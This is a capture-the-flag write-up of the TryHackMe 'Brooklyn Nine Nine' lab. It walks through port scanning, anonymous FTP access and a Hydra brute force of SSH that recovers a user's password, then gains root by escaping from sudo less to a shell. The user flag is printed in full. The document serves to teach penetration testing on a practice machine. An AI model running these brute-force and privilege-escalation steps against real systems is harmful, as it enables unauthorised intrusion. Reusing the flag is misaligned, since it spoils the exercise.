---
description: 23 May, 2025 - Xploit0x90
icon: flag
---

# Brooklyn Nine Nine CTF

<figure><img src="../.gitbook/assets/1,286 (3).png" alt=""><figcaption></figcaption></figure>

* Difficulty : <mark style="color:green;">Easy</mark>
* Link : [https://tryhackme.com/room/brooklynninenine](https://tryhackme.com/room/brooklynninenine)
* Creator : [Fsociety2006](https://tryhackme.com/p/Fsociety2006)

## 🕵️ Brooklyn Nine Nine — TryHackMe Walkthrough

_This machine focuses on core skills: port scanning, FTP enumeration, password brute-forcing, and privilege escalation using a misconfigured binary._

***

### 🚀 Deploy the Machine

I started the **Brooklyn Nine Nine** room on TryHackMe, deployed the machine, and grabbed its IP: `10.10.51.238`.

***

### 🔎 Enumeration

#### 🔹 Full Port Scan

I ran a full TCP port scan to find open services:

```bash
nmap -p- -T5 10.10.51.238
```

```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme]
└─$ nmap -p- -T5 10.10.51.238                           
Starting Nmap 7.94SVN ( <https://nmap.org> ) at 2025-05-23 17:16 EDT
Nmap scan report for ninenine.thm (10.10.51.238)
Host is up (0.034s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

**Result:**

```
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

➤ This reveals FTP, SSH, and HTTP services are open.

***

#### 🔹 Version and Script Scan

Next, I ran a more detailed scan on the discovered ports:

```bash
nmap -p21,22,80 -A -T4 10.10.51.238
```

```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme]
└─$ nmap -p21,22,80 -A -T4 10.10.51.238
Starting Nmap 7.94SVN ( <https://nmap.org> ) at 2025-05-23 17:17 EDT
Nmap scan report for ninenine.thm (10.10.51.238)
Host is up (0.032s latency).

PORT   STATE SERVICE VERSION

21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.99.28
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status

22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
|_  256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)

80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

**Key results:**

* **FTP (21):** vsftpd 3.0.3 — Anonymous login allowed ✅
* **SSH (22):** OpenSSH 7.6p1
* **HTTP (80):** Apache 2.4.29

***

### 📁 FTP Enumeration (Port 21)

Since FTP allowed **anonymous login**, I connected and found a file:

```bash
ftp 10.10.51.238
```

```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme]
└─$ ftp 10.10.51.238                     
Connected to 10.10.51.238.
220 (vsFTPd 3.0.3)
Name (10.10.51.238:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||6194|)
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> cat note_to_jake.txt
?Invalid command.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
229 Entering Extended Passive Mode (|||31632|)
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
100% |*********************|   119      535.53 KiB/s    00:00 ETA
226 Transfer complete.
119 bytes received in 00:00 (2.87 KiB/s)

```

```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme]
└─$ cat note_to_jake.txt 
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine

```

**Login:**

* Username: `anonymous`
* Password: (blank)

**Discovered:**

```
note_to_jake.txt
```

I downloaded it:

```bash
get note_to_jake.txt
```

Read it:

```bash
cat note_to_jake.txt
```

**Contents:**

```
From Amy,

Jake please change your password. It is too weak and Holt will be mad if someone hacks into the Nine Nine.
```

🔍 We now know:

* Users: `jake`, `amy`
* Jake uses a **weak password**

***

### 🔓 SSH Brute Force (Port 22)

Based on the weak password hint, I used **Hydra** to brute-force `jake`’s SSH password:

```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme]
└─$ hydra -l jake -P /usr/share/wordlists/rockyou.txt 10.10.51.238 ssh
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (<https://github.com/vanhauser-thc/thc-hydra>) starting at 2025-05-23 17:35:15
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.51.238:22/
[22][ssh] host: 10.10.51.238   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
```

✅ **Success!**

* Username: `jake`
* Password: `987654321`

I logged in:

```bash
┌──(kali㉿kali)-[~/Desktop/tryhackme]
└─$ ssh jake@10.10.51.238          
The authenticity of host '10.10.51.238 (10.10.51.238)' can't be established.
ED25519 key fingerprint is SHA256:ceqkN71gGrXeq+J5/dquPWgcPWwTmP2mBdFS2ODPZZU.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.51.238' (ED25519) to the list of known hosts.
jake@10.10.51.238's password: 
Last login: Tue May 26 08:56:58 2020
```

***

### 🧑‍💻 Post-Login Enumeration

Inside `/home`, I found 3 user folders:

* `jake`
* `amy`
* `holt`

In `holt`’s directory, I found:

```bash
jake@brookly_nine_nine:/home/holt$ cat user.txt 
ee11cbb19052e40b07aac0ca060c23ee
```

🎯 **User flag:**

```
ee11cbb19052e40b07aac0ca060c23ee
```

***

### 🔼 Privilege Escalation

#### 🔍 Sudo Enumeration

I checked for sudo permissions:

```bash
sudo -l
```

**Output:**

```bash
jake@brookly_nine_nine:/home/holt$ sudo -l
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

➤ That means I can run `less` as root without a password!

***

#### 🧨 Exploit via GTFOBins

Using [GTFOBins](https://gtfobins.github.io/gtfobins/less/), I escaped into a root shell like this:

```bash
sudo less /etc/profile
```

Inside `less`, I typed:

```
!sh
```

✅ Boom — root shell.

***

### 👑 Getting the Root Flag

Once root, I did the usual:

```bash
cd /root
ls
cat root.txt
```

**Output:**

```
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
```

***

**Root flag obtained!** Congratulations, you’ve just pwned the machine! **Root flag obtained!**
